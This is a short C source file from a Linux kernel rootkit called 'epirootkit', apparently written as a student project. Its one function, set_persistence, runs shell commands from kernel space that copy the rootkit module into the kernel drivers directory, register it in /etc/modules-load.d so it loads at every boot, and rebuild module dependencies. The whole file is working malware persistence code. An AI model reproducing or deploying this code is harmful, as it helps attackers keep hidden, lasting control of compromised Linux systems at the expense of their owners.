#include "rootkit.h"

// Active la persistence
void set_persistence(void) {
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL };
    char *argv0[] = { "/bin/mkdir", "-p", "/etc/modules-load.d", NULL };
    char *argv1[] = { "/bin/sh", "-c", 
                     "find /home -name 'epirootkit.ko' 2>/dev/null | head -1 | xargs -I {} cp {} /lib/modules/$(uname -r)/kernel/drivers/ 2>/dev/null || true", NULL };
    char *argv2[] = { "/bin/sh", "-c", 
                     "echo 'epirootkit' > /etc/modules-load.d/rootkit.conf", NULL };
    char *argv3[] = { "/sbin/depmod", "-a", NULL };
    
    call_usermodehelper(argv0[0], argv0, envp, UMH_WAIT_PROC);
    
    call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC);
    
    call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC);
    
    call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC);
    
    printk(KERN_INFO "[ROOTKIT] Persistence configured automatically\n");
}
